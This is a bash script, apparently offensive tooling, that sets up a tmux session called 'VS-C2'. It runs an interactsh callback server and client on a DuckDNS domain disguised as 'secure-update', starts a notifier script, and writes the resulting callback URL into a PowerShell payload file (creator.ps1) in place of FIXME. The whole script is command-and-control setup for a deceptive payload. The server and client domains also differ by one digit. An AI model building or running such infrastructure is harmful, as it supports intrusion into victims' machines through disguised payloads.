#!/bin/bash
## add when script ends to put the fixme back into the creator.ps1
# Check if the VS-C2 tmux session already exists
if tmux has-session -t VS-C2 2>/dev/null; then
    read -p "A tmux session named VS-C2 already exists. Do you want to kill it? (y/n) " yn
    case $yn in
        [Yy]* ) tmux kill-session -t VS-C2;;
        * ) echo "Exiting script..."; exit;;
    esac
fi

# Start a new VS-C2 tmux session
tmux new-session -d -s VS-C2
tmux new-window -n server -t VS-C2:1 'sudo interactsh-server -domain secure-update-84799327423.duckdns.org -skip-acme'
sleep 1
tmux new-window -n client -t VS-C2:2 'interactsh-client -v -s secure-update-8479927423.duckdns.org -o $HOME/output.log'
sleep 1
tmux new-window -n notify -t VS-C2:3 'python3 run.py'
sleep 1

output=$(tmux capture-pane -p -S - -E - -t client | grep -v "Listing 1 payload for OOB Testing")
url=$(echo "$output" | grep -o '\[INF\] .*' | sed 's/\[INF\] //')
echo "[+] Your custom payload url: $url"

sed -i "s/FIXME/$url/g" creator.ps1